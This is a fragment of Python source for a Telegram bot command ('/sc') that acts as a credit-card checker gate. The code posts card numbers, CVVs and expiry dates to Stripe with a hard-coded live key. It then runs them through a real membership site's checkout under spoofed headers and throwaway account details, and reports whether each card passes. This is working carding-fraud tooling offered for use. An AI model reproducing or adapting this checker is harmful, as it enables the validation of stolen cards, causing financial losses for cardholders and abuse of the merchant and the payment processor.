...
headers = {
    ...
    "origin": "https://kingofhounds.com",
    "referer": "https://kingofhounds.com/membership-account/membership-checkout/",
    "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"}




@Client.on_message(filters.command(["sc"], prefixes=[".", "/", "!"], case_sensitive=False) & filters.text)
                    ...
                    try:
                        ...
                        if int(cc[0]) in waste_cards:
                            ...
                            if res.status_code != requests.codes.ok or json.loads(res.text)['result'] == False:
                                ...
                                data = f"type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F8c76cc818%3B+stripe-js-v3%2F8c76cc818&time_on_page=45974&key=pk_live_51H2XeJI0BMm2yfAej2z0S7PWt3DsBTggAfe7cgIAdeUp6sq5N6b66YLpQQzZ6vOMCCU6UKoEp6XnGdLb0B3xXzHe00DGQSieMK"
...
<b>○</b> BOT BY: <b>@RoldexVerse</b>"""
                                    await msg.edit_text(text)
                                    data = f"level=1&checkjavascript=1&username={get_username()}&password={password}&password2={password}&bemail={email}&bconfirmemail={email}&fullname=&CardType={vendor}&discount_code=&tos=1&submit-checkout=1&javascriptok=1&payment_method_id={id}&AccountNumber={cc}&ExpirationMonth={mes}&ExpirationYear={ano}"
                                    res = curl.post("https://kingofhounds.com/membership-account/membership-checkout/",headers=headers,data=data)
                                    text = f"""
<b>〄</b> GATE: <b>STRIPE AUTH [2]</b>
<b>○</b> INPUT: <code>{lista}</code>
<b>○</b> PROCESS: <b>■■■■■■■■■■ 100%</b>
